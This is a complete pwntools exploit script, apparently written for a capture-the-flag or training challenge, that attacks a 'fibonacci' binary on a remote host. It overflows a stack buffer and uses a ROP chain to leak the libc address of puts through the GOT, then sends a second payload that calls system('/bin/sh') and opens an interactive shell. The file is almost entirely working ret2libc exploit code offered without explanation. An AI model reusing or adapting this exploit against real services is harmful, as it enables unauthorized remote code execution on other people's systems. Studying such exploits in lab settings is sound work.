from pwn import *

BIN = './fibonacci'
LIBC = './libc.so.6'

context.binary = BIN

e = ELF(BIN)
libc = ELF(LIBC)

# p = process(BIN)
p = remote('141.85.224.106', '31348')

p.recvline() # Skip the 'What fibonacci number do you want?\n' line

pop_rdi_ret_address = 0x00000000004007b3
buffer_size = 0x20
old_rbp_offset = 0x8
puts_plt_address = e.plt['puts']
puts_got_address = e.got['puts']
main_address = e.symbols['main']

payload1 = b'1' * 8
payload1 += b'A' * (buffer_size + old_rbp_offset - 8)
payload1 += p64(pop_rdi_ret_address)
payload1 += p64(puts_got_address)
payload1 += p64(puts_plt_address)
payload1 += p64(main_address)

p.sendline(payload1)

puts_address = u64(p.recvline().strip().ljust(8, b'\x00')) # The puts address
libc.address = puts_address - libc.symbols['puts']

system_address = libc.symbols['system']
bin_sh_address = next(libc.search(b'/bin/sh'))

p.recvline() # Skip the 'What fibonacci number do you want?\n' line

payload2 = b'1' * 8
payload2 += b'A' * (buffer_size + old_rbp_offset - 8)
payload2 += p64(pop_rdi_ret_address)
payload2 += p64(bin_sh_address)
payload2 += p64(system_address)
payload2 += p64(main_address)

p.sendline(payload2)

p.interactive()
